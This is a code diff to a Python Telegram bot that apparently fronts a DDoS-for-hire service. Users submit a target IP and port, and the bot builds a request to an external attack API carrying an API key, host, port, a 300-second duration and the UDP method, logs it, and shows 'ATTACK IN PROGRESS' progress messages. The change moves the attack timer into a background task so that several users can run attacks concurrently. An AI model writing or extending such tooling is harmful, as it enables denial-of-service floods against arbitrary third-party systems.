@@ -69,6 +69,68 @@ def create_progress_bar(current, total, length=20):
     percentage = int((current / total) * 100)
     return bar, percentage
 
+# ==================== ATTACK FUNCTION (RUNS IN BACKGROUND) ====================
+async def run_attack_timer(update: Update, ip: str, port: str, attack_link: str, attack_duration: int = 300):
+    """Background task for attack timer"""
+    
+    # Progress message start
+    progress_msg = await update.message.reply_text(
+        f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"🔧 Method: UDP\n"
+        f"⏱️ Time: {attack_duration} seconds\n\n"
+        f"┌{'─' * 24}┐\n"
+        f"│  ▓░░░░░░░░░░░░░░░░░░░  0%  │\n"
+        f"└{'─' * 24}┘\n\n"
+        f"⏳ Remaining: {attack_duration}s\n\n"
+        f"🔗 Attack Link:\n{attack_link}",
+        parse_mode='Markdown'
+    )
+    
+    # Timer loop
+    for elapsed in range(0, attack_duration + 1, 10):
+        remaining = attack_duration - elapsed
+        bar, percentage = create_progress_bar(elapsed, attack_duration)
+        
+        # Alert when 30-40 seconds remaining
+        if 30 <= remaining <= 40:
+            await update.message.reply_text(
+                f"🚨 *ALERT!* 🚨\n\n"
+                f"⚠️ Attack will complete in `{remaining}` seconds!\n"
+                f"🎯 Target: `{ip}:{port}`",
+                parse_mode='Markdown'
+            )
+        
+        # Update progress bar
+        try:
+            await progress_msg.edit_text(
+                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                f"🎯 Target: `{ip}:{port}`\n"
+                f"🔧 Method: UDP\n"
+                f"⏱️ Time: {attack_duration} seconds\n\n"
+                f"┌{'─' * 24}┐\n"
+                f"│  {bar}  {percentage}%  │\n"
+                f"└{'─' * 24}┘\n\n"
+                f"⏳ Remaining: {remaining}s\n\n"
+                f"🔗 Attack Link:\n{attack_link}",
+                parse_mode='Markdown'
+            )
+        except:
+            pass
+        
+        await asyncio.sleep(10)
+    
+    # Attack complete
+    await progress_msg.delete()
+    await update.message.reply_text(
+        f"✅ *Attack Complete!*\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"⏱️ Duration: {attack_duration}s\n"
+        f"🔧 Method: UDP\n\n"
+        f"🔗 Attack Link:\n{attack_link}",
+        parse_mode='Markdown'
+    )
+
 # ==================== COMMANDS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -130,71 +192,24 @@ async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port must be a number!")
         return
     
-    # Sirf link generate karo
+    # Generate attack link
     attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
     
     # Log save karo
     log_attack(user_id, ip, port, 300, 'udp', attack_link)
     
-    attack_duration = 300
-    
-    # Progress message start - WITHOUT backticks on link
-    progress_msg = await update.message.reply_text(
-        f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
-        f"🎯 Target: `{ip}:{port}`\n"
-        f"🔧 Method: UDP\n"
-        f"⏱️ Time: 300 seconds\n\n"
-        f"┌{'─' * 24}┐\n"
-        f"│  ▓░░░░░░░░░░░░░░░░░░░  0%  │\n"
-        f"└{'─' * 24}┘\n\n"
-        f"⏳ Remaining: 300s\n\n"
-        f"🔗 Attack Link:\n{attack_link}",
-        parse_mode='Markdown'
-    )
-    
-    # Timer loop
-    for elapsed in range(0, attack_duration + 1, 10):
-        remaining = attack_duration - elapsed
-        bar, percentage = create_progress_bar(elapsed, attack_duration)
-        
-        # Alert when 30-40 seconds remaining
-        if 30 <= remaining <= 40:
-            await update.message.reply_text(
-                f"🚨 *ALERT!* 🚨\n\n"
-                f"⚠️ Attack will complete in `{remaining}` seconds!\n"
-                f"🎯 Target: `{ip}:{port}`",
-                parse_mode='Markdown'
-            )
-        
-        # Update progress bar - WITHOUT backticks on link
-        try:
-            await progress_msg.edit_text(
-                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
-                f"🎯 Target: `{ip}:{port}`\n"
-                f"🔧 Method: UDP\n"
-                f"⏱️ Time: {attack_duration} seconds\n\n"
-                f"┌{'─' * 24}┐\n"
-                f"│  {bar}  {percentage}%  │\n"
-                f"└{'─' * 24}┘\n\n"
-                f"⏳ Remaining: {remaining}s\n\n"
-                f"🔗 Attack Link:\n{attack_link}",
-                parse_mode='Markdown'
-            )
-        except:
-            pass
-        
-        await asyncio.sleep(10)
-    
-    # Attack complete - WITHOUT backticks on link
-    await progress_msg.delete()
+    # Send confirmation
     await update.message.reply_text(
-        f"✅ *Attack Complete!*\n\n"
+        f"✅ *Attack Started!*\n\n"
         f"🎯 Target: `{ip}:{port}`\n"
-        f"⏱️ Duration: {attack_duration}s\n"
+        f"⏱️ Duration: 300 seconds\n"
         f"🔧 Method: UDP\n\n"
-        f"🔗 Attack Link:\n{attack_link}",
+        f"⏳ Timer has been started...",
         parse_mode='Markdown'
     )
+    
+    # Start timer in background (non-blocking)
+    asyncio.create_task(run_attack_timer(update, ip, port, attack_link, 300))
 
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -279,7 +294,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("🤖 Bot is running with Timer & Progress Bar features...")
+    print("🤖 Bot is running with Multi-User Timer Support...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
